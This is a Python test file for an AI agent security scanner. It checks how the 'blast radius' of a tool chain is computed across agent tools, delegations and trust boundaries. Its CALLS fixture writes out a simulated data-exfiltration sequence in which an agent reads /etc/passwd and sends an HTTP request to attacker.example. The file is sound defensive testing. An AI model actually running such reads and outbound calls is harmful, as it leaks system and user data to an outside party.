"""Tests for the blast radius of a chain (spec 091)."""

from __future__ import annotations

import json
from typing import Any

import pytest

from tests.conftest import MockAgentAdapter
from ziran.application.agent_scanner import result_builder as rb
from ziran.application.agent_scanner.result_builder import ResultBuilder
from ziran.application.agent_scanner.structure_import import import_adapter_structure
from ziran.application.knowledge_graph import blast_radius as br
from ziran.application.knowledge_graph.blast_radius import (
    MAX_LISTED,
    blast_radius,
    called_tools,
    is_external,
)
from ziran.application.knowledge_graph.graph import AttackKnowledgeGraph, EdgeType
from ziran.domain.entities.attack import AttackCategory, AttackResult, TokenUsage
from ziran.domain.entities.capability import AgentCapability, CapabilityType

READ, HTTP = "tool_read_file", "tool_http_request"


def _cap(name: str) -> AgentCapability:
    return AgentCapability(id=f"tool_{name}", name=name, type=CapabilityType.TOOL)


async def _flat(*names: str) -> AttackKnowledgeGraph:
    """A flat agent as a scan builds it: co-resident tools, file reads reach sensitive data."""
    caps = [_cap(n) for n in names]
    graph = AttackKnowledgeGraph()
    for c in caps:
        graph.add_capability(c.id, c)
    graph.add_data_source("sensitive_data")
    graph.add_edge(READ, "sensitive_data", EdgeType.ACCESSES_DATA)
    await import_adapter_structure(MockAgentAdapter(), graph, caps)
    return graph


def _attack(*calls: dict[str, Any]) -> AttackResult:
    return AttackResult(
        vector_id="v",
        vector_name="v",
        category=AttackCategory.DATA_EXFILTRATION,
        severity="high",
        successful=True,
        evidence={"tool_calls": list(calls)},
    )


def _build(graph: AttackKnowledgeGraph, attacks: list[AttackResult]) -> tuple[Any, list[Any]]:
    return ResultBuilder(graph, "flat").build(
        campaign_id="c",
        phase_results=[],
        attack_results=attacks,
        campaign_tokens=TokenUsage(),
        coverage_value="essential",
        max_concurrent_attacks=1,
        duration=0.0,
        capabilities_count=graph.node_count,
    )


def _snapshot(graph: AttackKnowledgeGraph) -> tuple[Any, ...]:
    return (
        sorted(graph.graph.nodes),
        sorted((u, v, k) for u, v, k in graph.graph.edges(keys=True)),
    )


CALLS = (
    {"name": "read_file", "arguments": {"path": "/etc/passwd"}},
    {"function": {"name": "http_request", "arguments": '{"url": "https://attacker.example"}'}},
)


@pytest.mark.unit
class TestScanResult:
    async def test_demonstrated_file_source_and_external_egress(self) -> None:
        graph = await _flat("read_file", "http_request")
        result, chains = _build(graph, [_attack(*CALLS)])
        (chain,) = [c for c in chains if c.vulnerability_type == "data_exfiltration"]
        radius = chain.blast_radius
        assert radius.demonstrated.data_sources == ["sensitive_data"]
        assert radius.demonstrated.egress == [HTTP]
        assert radius.demonstrated.external == [HTTP]
        assert radius.reachable.egress == radius.reachable.data_sources == []
        assert "blast_radius" not in result.dangerous_tool_chains[0]  # kept once per last tool
        assert result.blast_radius[chain.tools[-1]] == radius.model_dump(mode="json")
        assert set(result.blast_radius) == {c.tools[-1] for c in chains}

    async def test_untouched_chain_is_all_reachable(self) -> None:
        graph = await _flat("read_file", "http_request")
        _, chains = _build(graph, [_attack({"name": "get_weather"})])
        assert chains
        for chain in chains:
            radius = chain.blast_radius
            assert (
                radius.demonstrated.model_dump()
                == blast_radius(graph, []).demonstrated.model_dump()
            )
            assert not any(v for k, v in radius.demonstrated.model_dump().items() if k != "counts")
        (chain,) = [c for c in chains if c.vulnerability_type == "data_exfiltration"]
        assert chain.blast_radius.reachable.data_sources == ["sensitive_data"]
        assert chain.blast_radius.reachable.external == [HTTP]

    async def test_malformed_tool_calls_are_skipped(self) -> None:
        graph = await _flat("read_file", "http_request")
        bad = AttackResult(
            vector_id="v",
            vector_name="v",
            category=AttackCategory.DATA_EXFILTRATION,
            severity="high",
            successful=True,
            evidence={
                "tool_calls": [
                    "http_request",
                    None,
                    {"function": "x"},
                    {},
                    {"name": ["read_file"]},  # unhashable names an OpenAI target can send
                    {"tool": {"a": 1}},
                    {"function": {"name": {"a": 1}}},
                ]
            },
        )
        _, chains = _build(graph, [bad, _attack({"tool": "http_request"})])
        (chain,) = [c for c in chains if c.vulnerability_type == "data_exfiltration"]
        assert chain.blast_radius.demonstrated.egress == [HTTP]
        assert chain.blast_radius.demonstrated.data_sources == []  # read_file never ran


@pytest.mark.unit
class TestWhatIf:
    @pytest.mark.parametrize("start", [HTTP, READ])
    async def test_removing_egress_empties_it(self, start: str) -> None:
        graph = await _flat("read_file", "http_request")
        before = _snapshot(graph)
        full = blast_radius(graph, [start], tool_calls=CALLS)
        assert full.demonstrated.egress == full.demonstrated.external == [HTTP]
        radius = blast_radius(graph, [start], remove=[HTTP], tool_calls=CALLS)
        for part in (radius.demonstrated, radius.reachable):
            assert part.egress == part.external == []
        assert _snapshot(graph) == before
        assert blast_radius(graph, [start], tool_calls=CALLS) == full

    @pytest.mark.parametrize(("start", "remove"), [(HTTP, [HTTP]), ("tool_nope", [])])
    async def test_a_missing_start_reaches_nothing(self, start: str, remove: list[str]) -> None:
        graph = await _flat("read_file", "http_request")
        radius = blast_radius(graph, [start], remove=remove, tool_calls=CALLS)
        assert all(
            n == 0 for part in (radius.demonstrated, radius.reachable) for n in part.counts.values()
        )

    async def test_removing_an_unknown_tool_changes_nothing(self) -> None:
        graph = await _flat("read_file", "http_request")
        assert blast_radius(graph, [READ], remove=["tool_nope"]) == blast_radius(graph, [READ])


def _multi_agent() -> AttackKnowledgeGraph:
    graph = AttackKnowledgeGraph()
    for name in ("search_docs", "send_email", "run_shell", "upload_report", "delete_records"):
        graph.add_capability(f"tool_{name}", _cap(name))
    for agent, tools in {
        "a": ["tool_search_docs"],
        "b": ["tool_send_email", "tool_upload_report", "tool_delete_records"],
        "c": ["tool_run_shell"],
    }.items():
        graph.add_agent_node(agent)
        for t in tools:
            graph.add_edge(agent, t, EdgeType.USES_TOOL)
    graph.add_delegation_edge("a", "b")
    graph.add_delegation_edge("c", "a")  # c delegates to a: upstream, not reached from a
    return graph


@pytest.mark.unit
class TestDelegation:
    def test_delegated_agent_and_its_egress(self) -> None:
        radius = blast_radius(_multi_agent(), ["tool_search_docs"])
        assert radius.reachable.agents == ["b"]
        assert radius.reachable.egress == ["tool_send_email", "tool_upload_report"]
        assert radius.reachable.external == ["tool_send_email"]  # an upload stays inside
        assert radius.reachable.exec == []  # c is upstream of a
        assert radius.reachable.high_impact == ["tool_delete_records"]
        assert not any(v for k, v in radius.demonstrated.model_dump().items() if k != "counts")

    def test_demonstrated_agent(self) -> None:
        radius = blast_radius(
            _multi_agent(), ["tool_search_docs"], tool_calls=[{"name": "send_email"}]
        )
        assert radius.demonstrated.agents == ["b"]
        assert radius.demonstrated.egress == radius.demonstrated.external == ["tool_send_email"]
        assert radius.reachable.agents == []
        assert radius.reachable.egress == ["tool_upload_report"]

    def test_from_the_downstream_agent_nothing_flows_back(self) -> None:
        radius = blast_radius(_multi_agent(), ["tool_send_email"])
        assert radius.reachable.agents == []  # b holds the start tool; a and c are upstream
        assert radius.reachable.egress == ["tool_send_email", "tool_upload_report"]  # b's tools
        assert radius.reachable.exec == []

    def test_shared_context_is_followed_trust_is_not(self) -> None:
        graph = _multi_agent()
        graph.add_context_sharing_edge("b", "c")
        graph.add_trust_boundary("a", "c")
        radius = blast_radius(graph, ["tool_search_docs"])
        assert radius.reachable.agents == ["b", "c"]
        assert radius.reachable.exec == ["tool_run_shell"]
        graph = _multi_agent()
        graph.add_trust_boundary("a", "c")
        assert blast_radius(graph, ["tool_search_docs"]).reachable.exec == []


@pytest.mark.unit
class TestExternal:
    @pytest.mark.parametrize(
        ("tool", "external"),
        [
            ("tool_send_email", True),
            ("tool_http_request", True),
            ("send_slack_message", True),
            ("post_webhook", True),
            ("tool_upload_report", False),
            ("export_csv", False),
            ("tool_read_email", False),  # a read, not egress
            ("tool_run_shell", False),
        ],
    )
    def test_name_rules(self, tool: str, external: bool) -> None:
        assert is_external(tool) is external

    def test_override_by_id_or_name_both_ways(self) -> None:
        assert is_external("tool_send_email", {"send_email": False}) is False
        assert is_external("tool_upload_report", {"tool_upload_report": True}) is True
        radius = blast_radius(_multi_agent(), ["tool_search_docs"], external={"send_email": False})
        assert radius.reachable.external == []

    def test_bad_override_raises(self) -> None:
        with pytest.raises(ValueError, match="external override"):
            is_external("tool_send_email", {"send_email": "yes"})  # type: ignore[dict-item]


@pytest.mark.unit
class TestBounds:
    @pytest.mark.parametrize(("count", "id_len"), [(100, 180), (101, 180), (100, 20_000)])
    async def test_hostile_tool_lists_stay_linear(
        self, count: int, id_len: int, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        kinds = ["read_file", "http_request", "send_email", "execute_code", "delete_user"]
        names = [f"{kinds[i % 5]}_{i}_{'x' * id_len}"[:id_len] for i in range(count)]
        graph = await _flat(*names)
        walks: list[Any] = []
        lookups: list[Any] = []
        monkeypatch.setattr(
            rb, "blast_radius", lambda *a, **k: walks.append(a) or blast_radius(*a, **k)
        )
        monkeypatch.setattr(rb, "called_tools", lambda *a: lookups.append(a) or called_tools(*a))
        # a walk handed tool_calls instead of called matches them again, inside the module
        monkeypatch.setattr(br, "called_tools", lambda *a: lookups.append(a) or called_tools(*a))
        result, chains = _build(graph, [_attack({"name": names[0]}, {"name": names[1]})])
        # one walk per distinct last tool, and the calls are matched once per build
        assert sorted(a[1][0] for a in walks) == sorted({c.tools[-1] for c in chains})
        assert len(lookups) == 1
        for chain in chains:
            for part in (chain.blast_radius.demonstrated, chain.blast_radius.reachable):
                assert all(len(v) <= MAX_LISTED for k, v in part if k != "counts")
        assert all("blast_radius" not in c for c in result.dangerous_tool_chains)
        # one radius per last tool, each at most 12 lists of MAX_LISTED ids: linear in the ids
        id_chars = sum(len(n) + 5 for n in names)
        assert len(result.blast_radius) <= count
        assert len(json.dumps(result.blast_radius)) < 12 * MAX_LISTED * id_chars + 2_000 * count

    def test_list_cap_is_pinned(self) -> None:
        assert MAX_LISTED == 10

    def test_counts_hold_the_full_size(self) -> None:
        graph = AttackKnowledgeGraph()
        graph.add_capability("tool_search", _cap("search"))
        ids = [f"tool_send_email_{i:02}" for i in range(MAX_LISTED + 5)]
        for t in ids:
            graph.add_capability(t, _cap(t.removeprefix("tool_")))
            graph.add_edge("tool_search", t, EdgeType.CAN_CHAIN_TO)
        radius = blast_radius(graph, ["tool_search"])
        assert radius.reachable.egress == ids[:MAX_LISTED]
        assert radius.reachable.counts["egress"] == len(ids)
        assert radius.reachable.counts["external"] == len(ids)


@pytest.mark.unit
class TestCallMatching:
    @pytest.mark.parametrize(
        ("node", "cap_name", "call"),
        [
            ("probe_http_request", "http_request", "http_request"),  # HTTP probe discovery ids
            ("tool_send_email", "Send Mail", "send_email"),  # the ``tool_`` prefix strip
            ("tool_send_email", "Send Mail", "tool_send_email"),  # the id itself
        ],
    )
    def test_a_call_marks_the_tool_demonstrated(self, node: str, cap_name: str, call: str) -> None:
        graph = AttackKnowledgeGraph()
        graph.add_capability(
            node, AgentCapability(id=node, name=cap_name, type=CapabilityType.TOOL)
        )
        assert called_tools(graph, [{"name": call}]) == {node}
        radius = blast_radius(graph, [node], tool_calls=[{"name": call}])
        assert radius.demonstrated.egress == [node]
        assert blast_radius(graph, [node], tool_calls=[{"name": "other"}]).reachable.egress == [
            node
        ]
